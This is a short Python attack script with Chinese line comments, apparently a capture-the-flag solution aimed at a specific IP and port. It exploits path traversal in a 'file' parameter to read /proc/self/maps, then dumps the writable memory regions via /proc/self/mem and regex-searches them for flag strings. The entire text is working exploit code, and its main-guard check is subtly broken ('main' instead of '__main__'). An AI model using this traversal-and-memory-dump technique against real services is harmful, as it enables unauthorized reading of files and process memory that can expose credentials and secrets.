import requests  # 导入requests模块，用于发送HTTP请求
import re  # 导入re模块，用于正则表达式操作

baseUrl = "http://61.147.171.105:63964/info?file=../.."  # 定义基础URL

if __name__ == "main":  # 如果该脚本作为主程序运行
    url = baseUrl + "/proc/self/maps"  # 构造URL，用于获取进程的内存映射信息
    memInfoList = requests.get(url).text.split("\n")  # 发送GET请求，获取内存映射信息，并按行分割
    print(memInfoList)  # 打印内存映射信息
    mem = ""  # 初始化内存内容为空字符串
    for i in memInfoList:  # 遍历内存映射信息
        memAddress = re.match(r"([a-z0-9]+)-([a-z0-9]+) rw", i)  # 使用正则表达式匹配内存地址
        if memAddress:  # 如果匹配成功
            start = int(memAddress.group(1), 16)  # 将起始地址转换为整数
            end = int(memAddress.group(2), 16)  # 将结束地址转换为整数
            infoUrl = baseUrl + "/proc/self/mem&start=" + str(start) + "&end=" + str(end)  # 构造URL，用于获取指定范围内的内存内容
            mem = requests.get(infoUrl).text  # 发送GET请求，获取内存内容
            if re.findall(r"{[\w]+}", mem):  # 如果内存内容中包含花括号包围的单词
                print(re.findall(r"\w+{[\w]+}", mem))  # 使用正则表达式匹配并打印花括号包围的单词
